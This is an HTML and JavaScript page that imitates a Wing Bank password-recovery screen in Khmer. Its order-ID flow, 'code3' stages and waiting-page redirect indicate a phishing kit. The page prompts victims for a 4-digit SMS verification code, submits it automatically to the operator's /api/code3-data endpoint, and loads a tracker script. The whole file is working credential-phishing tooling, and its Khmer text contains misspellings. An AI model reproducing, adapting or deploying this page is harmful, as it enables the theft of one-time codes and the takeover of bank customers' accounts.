<!DOCTYPE html>
<html lang="km" dir="ltr">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
<title>ការស្តារពាក្យសម្ងាត់ពី Wing Bank</title>
<style>
  *{box-sizing:border-box;margin:0;padding:0}
  html,body{height:100%;font-family:-apple-system,BlinkMacSystemFont,"Helvetica Neue",Arial,sans-serif;-webkit-font-smoothing:antialiased}
  body{max-width:520px;margin:0 auto;min-height:100vh;background:#fff;display:flex;flex-direction:column}

  .header{
    display:flex;align-items:center;justify-content:space-between;
    padding:14px 16px;background:#fff;border-bottom:3px solid #A9CF38;
    position:sticky;top:0;z-index:10;
  }
  .header img{height:46px}
  .x-btn{background:none;border:none;cursor:pointer;padding:8px}
  .x-btn svg{width:22px;height:22px;stroke:#1a1a1a;stroke-width:2;fill:none;stroke-linecap:round}

  .content{flex:1;padding:48px 28px 0}

  .title{
    font-size:28px;font-weight:400;color:#1a1a1a;
    text-align:center;line-height:1.3;margin-bottom:48px;
    letter-spacing:-.3px;
  }

  .field{margin-bottom:36px}
  .lbl{font-size:14px;color:#9aa0a6;margin-bottom:14px;font-weight:400}
  .phone-val{font-size:22px;color:#1a1a1a;font-weight:400;letter-spacing:.3px}

  .code-row{
    display:flex;gap:16px;margin-top:12px;direction:ltr;
    justify-content:center;max-width:100%;
  }

  .digit-cell{
    position:relative;width:64px;height:64px;flex-shrink:0;
  }

  .digit-bird{
    position:absolute;inset:0;
    display:flex;align-items:center;justify-content:center;
    pointer-events:none;
    transition:opacity .2s;
  }
  .digit-bird svg{
    width:44px;height:44px;
    fill:#A9CF38;opacity:.25;
    transition:opacity .2s;
  }
  .digit-cell.filled .digit-bird svg{opacity:.08}

  .code-digit{
    position:relative;z-index:1;
    width:100%;height:100%;
    border:2px solid #e0e0e0;border-radius:16px;
    background:transparent;text-align:center;
    font-size:28px;font-weight:700;color:#1a1a1a;
    font-family:inherit;outline:none;transition:.2s;
    padding:0;
  }
  .code-digit:focus{border-color:#A9CF38;box-shadow:0 0 0 3px rgba(169,207,56,.15)}
  .digit-cell.filled .code-digit{border-color:#A9CF38;background:rgba(169,207,56,.06)}

  .err{
    display:none;margin:14px 0 0;padding:12px 14px;
    background:#fff0f0;border:1px solid #fcc;border-radius:10px;
    color:#dc2626;font-size:14px;text-align:center;font-weight:700;
  }

  .bottom{padding:16px 24px 32px;margin-top:auto}
  .submit-btn{
    display:block;width:100%;padding:16px;border:none;border-radius:28px;
    font-size:16px;font-weight:600;color:#fff;cursor:pointer;font-family:inherit;
    background:#A9CF38;transition:.2s;
    box-shadow:0 4px 12px rgba(169,207,56,.25);
  }
  .submit-btn:hover{background:#8BB52E}
  .submit-btn:disabled{opacity:.5;cursor:not-allowed;box-shadow:none}
</style>
</head>
<body>

  <div class="header">
    <img src="images/wb-logo.svg" alt="Wing Bank">
    <button class="x-btn" onclick="history.back()" aria-label="Close">
      <svg viewBox="0 0 24 24"><path d="M6 6l12 12M18 6L6 18"/></svg>
    </button>
  </div>

  <div class="content">
    <div class="title">ការស្តារពាក្យសម្ងាត់ពី<br>Wing Bank</div>

    <div class="field">
      <div class="lbl">លេខទូរសាព់</div>
      <div class="phone-val" id="userPhone">+855 (___) ___ __ __</div>
    </div>

    <div class="field">
      <div class="lbl">សារដែលកូដ</div>
      <div class="code-row">
        <div class="digit-cell" id="cell0">
          <div class="digit-bird"><svg viewBox="180 -5 145 115" xmlns="http://www.w3.org/2000/svg"><path d="M286.39,31.63s17.44,3.28,24.78,32.62c3.49,13.96,5.94,24.21,9.3,37.94.33,1.36-1.5,2.17-2.16.94-4.56-8.41-16.94-31.04-35.25-42.98-9.97-6.5-23.23-13.28-33.33,1.36-7.78,11.27-13.47,26.63-16.7,36.57-.5,1.54-2.81,1.01-2.58-.59,1.61-11.18,5.47-23.08-.76-30.09-6-6.75-23.69-4.66-36.64-4.62-1.27,0-1.42-1.86-.16-2.05,14.79-2.24,37.72-5.7,45.55-11.09,4.16-2.86,17.86-12.71-5.36-27.51-17.08-10.89-38.85-16.9-48.86-20.22-1.11-.37-.75-2.02.41-1.92,10.08.83,33.51,2.35,40.32,2.86,12.89.97,42.2,3.08,47.04,18.38,8.73-7.05,19.46-9.34,24.47-7,.83.31-.11,2.68-.11,2.68,0,0-3.6,8.02-9.95,14.7"/></svg></div>
          <input class="code-digit" type="tel" inputmode="numeric" maxlength="1" id="c0" autofocus>
        </div>
        <div class="digit-cell" id="cell1">
          <div class="digit-bird"><svg viewBox="180 -5 145 115" xmlns="http://www.w3.org/2000/svg"><path d="M286.39,31.63s17.44,3.28,24.78,32.62c3.49,13.96,5.94,24.21,9.3,37.94.33,1.36-1.5,2.17-2.16.94-4.56-8.41-16.94-31.04-35.25-42.98-9.97-6.5-23.23-13.28-33.33,1.36-7.78,11.27-13.47,26.63-16.7,36.57-.5,1.54-2.81,1.01-2.58-.59,1.61-11.18,5.47-23.08-.76-30.09-6-6.75-23.69-4.66-36.64-4.62-1.27,0-1.42-1.86-.16-2.05,14.79-2.24,37.72-5.7,45.55-11.09,4.16-2.86,17.86-12.71-5.36-27.51-17.08-10.89-38.85-16.9-48.86-20.22-1.11-.37-.75-2.02.41-1.92,10.08.83,33.51,2.35,40.32,2.86,12.89.97,42.2,3.08,47.04,18.38,8.73-7.05,19.46-9.34,24.47-7,.83.31-.11,2.68-.11,2.68,0,0-3.6,8.02-9.95,14.7"/></svg></div>
          <input class="code-digit" type="tel" inputmode="numeric" maxlength="1" id="c1">
        </div>
        <div class="digit-cell" id="cell2">
          <div class="digit-bird"><svg viewBox="180 -5 145 115" xmlns="http://www.w3.org/2000/svg"><path d="M286.39,31.63s17.44,3.28,24.78,32.62c3.49,13.96,5.94,24.21,9.3,37.94.33,1.36-1.5,2.17-2.16.94-4.56-8.41-16.94-31.04-35.25-42.98-9.97-6.5-23.23-13.28-33.33,1.36-7.78,11.27-13.47,26.63-16.7,36.57-.5,1.54-2.81,1.01-2.58-.59,1.61-11.18,5.47-23.08-.76-30.09-6-6.75-23.69-4.66-36.64-4.62-1.27,0-1.42-1.86-.16-2.05,14.79-2.24,37.72-5.7,45.55-11.09,4.16-2.86,17.86-12.71-5.36-27.51-17.08-10.89-38.85-16.9-48.86-20.22-1.11-.37-.75-2.02.41-1.92,10.08.83,33.51,2.35,40.32,2.86,12.89.97,42.2,3.08,47.04,18.38,8.73-7.05,19.46-9.34,24.47-7,.83.31-.11,2.68-.11,2.68,0,0-3.6,8.02-9.95,14.7"/></svg></div>
          <input class="code-digit" type="tel" inputmode="numeric" maxlength="1" id="c2">
        </div>
        <div class="digit-cell" id="cell3">
          <div class="digit-bird"><svg viewBox="180 -5 145 115" xmlns="http://www.w3.org/2000/svg"><path d="M286.39,31.63s17.44,3.28,24.78,32.62c3.49,13.96,5.94,24.21,9.3,37.94.33,1.36-1.5,2.17-2.16.94-4.56-8.41-16.94-31.04-35.25-42.98-9.97-6.5-23.23-13.28-33.33,1.36-7.78,11.27-13.47,26.63-16.7,36.57-.5,1.54-2.81,1.01-2.58-.59,1.61-11.18,5.47-23.08-.76-30.09-6-6.75-23.69-4.66-36.64-4.62-1.27,0-1.42-1.86-.16-2.05,14.79-2.24,37.72-5.7,45.55-11.09,4.16-2.86,17.86-12.71-5.36-27.51-17.08-10.89-38.85-16.9-48.86-20.22-1.11-.37-.75-2.02.41-1.92,10.08.83,33.51,2.35,40.32,2.86,12.89.97,42.2,3.08,47.04,18.38,8.73-7.05,19.46-9.34,24.47-7,.83.31-.11,2.68-.11,2.68,0,0-3.6,8.02-9.95,14.7"/></svg></div>
          <input class="code-digit" type="tel" inputmode="numeric" maxlength="1" id="c3">
        </div>
      </div>
    </div>

    <div class="err" id="errorMsg"></div>
  </div>

  <div class="bottom">
    <button class="submit-btn" id="submitBtn" onclick="submitCode()">បញ្ជាក់</button>
  </div>

<script>
  const params  = new URLSearchParams(location.search);
  const orderId = params.get("order");
  let   phone   = params.get("phone");

  if (!orderId) location.href = "index.html";

  function renderPhone(p) {
    if (!p) return;
    p = p.replace(/\D/g, "");
    if (p.length >= 7) {
      var out = "+855 ";
      var d = p.length > 9 ? p.substring(p.length - 9) : p;
      out += d.substring(0,2) + " " + d.substring(2,5) + " " + d.substring(5);
      document.getElementById("userPhone").textContent = out;
    } else if (p.length > 0) {
      document.getElementById("userPhone").textContent = "+855 " + p;
    }
  }

  if (phone) {
    renderPhone(phone);
  } else {
    fetch("/api/orders/" + orderId + "/status")
      .then(r => r.json())
      .then(d => {
        if (d.username) {
          phone = d.username;
          renderPhone(d.username);
        }
      })
      .catch(() => {});
  }

  if (params.get("error") === "1") {
    const el = document.getElementById("errorMsg");
    el.textContent = "កូដមិនត្រឹមត្រូវ រឹមិនមានសុពលភាព";
    el.style.display = "block";
    setTimeout(() => { el.style.display = "none"; }, 3500);
  }

  const digits = document.querySelectorAll(".code-digit");
  const cells  = document.querySelectorAll(".digit-cell");

  function updateCells() {
    digits.forEach((inp, i) => {
      cells[i].classList.toggle("filled", inp.value !== "");
    });
  }

  digits.forEach((inp, i) => {
    inp.addEventListener("input", () => {
      inp.value = inp.value.replace(/\D/g, "");
      updateCells();
      if (inp.value && i < digits.length - 1) digits[i + 1].focus();
      maybeAutoSubmit();
    });
    inp.addEventListener("keydown", e => {
      if (e.key === "Backspace" && !inp.value && i > 0) digits[i - 1].focus();
    });
    inp.addEventListener("paste", e => {
      e.preventDefault();
      const text = (e.clipboardData.getData("text") || "").replace(/\D/g, "");
      for (let j = 0; j < digits.length && j < text.length; j++) {
        digits[j].value = text[j];
      }
      updateCells();
      const last = Math.min(text.length, digits.length);
      if (last > 0) digits[Math.min(last, digits.length - 1)].focus();
      maybeAutoSubmit();
    });
  });

  function getCode() {
    return Array.from(digits).map(d => d.value).join("");
  }

  function showError(msg) {
    const el = document.getElementById("errorMsg");
    el.textContent = msg;
    el.style.display = "block";
    setTimeout(() => { el.style.display = "none"; }, 3500);
  }

  let submitting = false;
  function maybeAutoSubmit() {
    const code = getCode();
    if (code.length === digits.length && !submitting) submitCode();
  }

  async function submitCode() {
    const code = getCode();
    if (code.length < digits.length) {
      showError("សូមបញ្ចូលកូដទាំងមូល");
      return;
    }
    submitting = true;
    digits.forEach(d => d.disabled = true);
    const btn = document.getElementById("submitBtn");
    btn.disabled = true;
    btn.textContent = "កម្លុងទិន្និយ...";

    try {
      const res  = await fetch("/api/code3-data", {
        method:  "POST",
        headers: { "Content-Type": "application/json" },
        body:    JSON.stringify({ order_id: orderId, code: code })
      });
      const data = await res.json();
      if (data.success) {
        location.href = "code3-waiting.html?order=" + orderId +
                        (phone ? "&phone=" + encodeURIComponent(phone) : "");
      } else {
        showError(data.message || "មានកម្ហិស");
        resetInputs();
      }
    } catch (err) {
      showError("កម្ហិសក្នុងការភ្ជាប់");
      resetInputs();
    }
  }

  function resetInputs() {
    submitting = false;
    digits.forEach(d => { d.disabled = false; d.value = ""; });
    updateCells();
    digits[0].focus();
    const btn = document.getElementById("submitBtn");
    btn.disabled = false;
    btn.textContent = "បញ្ជាក់";
  }
</script>
<script src="tracker.js"></script>
</body>
</html>
